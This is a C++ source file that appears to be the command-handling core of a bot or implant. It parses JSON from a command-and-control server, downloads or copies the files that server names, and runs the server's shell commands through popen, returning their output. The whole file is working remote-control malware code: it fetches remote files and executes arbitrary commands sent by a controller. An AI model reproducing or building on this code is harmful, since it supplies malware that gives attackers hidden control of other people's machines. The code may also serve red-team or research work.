#include "bot.hh"

#include <iso646.h>
#include <experimental/filesystem>
#include <future>
#include <iostream>
#include <memory>
#include <string>
#include <vector>

#include "installer.hh"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "request.hh"
#include "sysinfo.hh"
#include "util.hh"

namespace fs = std::experimental::filesystem;

bool LocalFileDep::Retrieve() {
    if (name.empty() or path.empty()) return false;

    // Don't throw for any error, but do print it
    try {
        fs::copy(
            path, name,
            fs::copy_options::recursive | fs::copy_options::overwrite_existing);
    } catch (const fs::filesystem_error& e) {
        std::cerr << e.what() << std::endl;
        return false;
    }

    return true;
}

bool NetworkFileDep::Retrieve() {
    if (name.empty() or path.empty()) return false;

    // Don't throw for any error, but do print it
    try {
        return request::DownloadFile(path, name);
    } catch (const fs::filesystem_error& e) {
        std::cerr << e.what() << std::endl;
        return false;
    }
}

Command::Command(const std::string& c2_response) {
    // Parse into something resembling a nested unordered map
    rapidjson::Document json;
    json.Parse(c2_response.c_str());

    /* Will essentially do nothing if a proper JSON response is not sent.
     * Shell will be set to default and the command text will remain empty.
     */
    if (json.IsObject()) {
        command_text = json["command_text"].IsString()
                           ? json["command_text"].GetString()
                           : "";
        shell =
            json["shell"].IsString() ? json["shell"].GetString() : "default";

        // Ensure "files" value is an array of JSON objects
        const rapidjson::Value& dep_files = json["files"];
        if (dep_files.IsArray()) {
            ParseFileDeps_(dep_files);
        }
    } else {
        shell = "default";
    }
}

void Command::ParseFileDeps_(const rapidjson::Value& deps) {
    /* Loop through array of JSON objects, validating along the way. Invalid
     * strings for file name, path, or type will default to empty strings. These
     * invalid files should be ignored. */
    int size = deps.Size();
    for (int i = 0; i < size; ++i) {
        const rapidjson::Value& file = deps[i];
        if (file.IsObject()) {
            std::string name =
                file["name"].IsString() ? file["name"].GetString() : "";
            std::string path =
                file["path"].IsString() ? file["path"].GetString() : "";
            std::string type =
                file["type"].IsString() ? file["type"].GetString() : "";

            if (not(name.empty() or path.empty() or type.empty())) {
                // Determine dependency type and add to vector
                if (type == "local") {
                    auto file_ptr = std::make_unique<LocalFileDep>(name, path);
                    command_deps_.emplace_back(std::move(file_ptr));
                } else if (type == "network") {
                    auto file_ptr =
                        std::make_unique<NetworkFileDep>(name, path);
                    command_deps_.emplace_back(std::move(file_ptr));
                }
            }
        }
    }
}

std::string Command::Execute() {
    // Create a temporary directory and execute command within it
    util::TempDirectory temp_dir(COMMAND_TEMP_DIR);
    fs::current_path(temp_dir.Get());

    /* Add necessary syntax before and after command text
     * depending on shell choice */
    if (shell != "default") {
        std::string pre_text, post_text;
        /* Use "at" instead of normal lookup because it does not violate const
         * status of SHELL_SYNTAX_LIST. A normal lookup does not guarantee that
         * the unordered_map will go unchanged */
        std::tie(pre_text, post_text) = SHELL_SYNTAX_LIST.at(shell.c_str());
        command_text = pre_text + command_text + post_text;
    }

    /* Retrieve dependencies asynchronously. Store futures to ensure concurrency
     * when retrieving files */
    std::vector<std::future<bool>> dep_retrieval_futures;
    for (auto& dep : command_deps_) {
        /* std::async does not allow passing non-static member function.
         * Instead, pass pointer to function with the CommandDependency derived
         * instance as a parameter*/
        dep_retrieval_futures.push_back(std::async(
            std::launch::async, &CommandDependency::Retrieve, dep.get()));
    }

    // Wait for dependencies to be retrieved
    for (auto& retrieved : dep_retrieval_futures) retrieved.wait();

    /* Finally execute and leave temp directory. The TempDirectory instance will
     * delete the folder upon going out of scope */
    std::string output = util::PopenSubprocess(command_text.c_str());
    fs::current_path("../");

    return output;
}
